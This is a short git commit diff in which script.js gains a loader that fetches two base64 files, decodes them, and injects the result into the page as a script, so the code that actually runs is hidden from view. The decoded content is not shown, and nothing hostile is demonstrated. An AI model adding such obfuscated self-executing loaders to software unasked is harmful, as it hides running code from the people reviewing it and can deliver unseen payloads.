b072d6eb6f87b938de0a1ddcd67d7f7c58381466
tnam <tnam17785@gmail.com>
2026-08-12 07:20:29 +0700

    v6: script loader (will decode full features)

--- script.js
+++ script.js
@@ -1,1 +1,11 @@
-/* see repo */
+(() => {
+  Promise.all([
+    fetch('script.b64.1').then(r => r.text()),
+    fetch('script.b64.2').then(r => r.text())
+  ]).then(([a, b]) => {
+    const code = atob(a + b);
+    const s = document.createElement('script');
+    s.textContent = code;
+    document.body.appendChild(s);
+  }).catch(err => console.error('load fail', err));
+})();
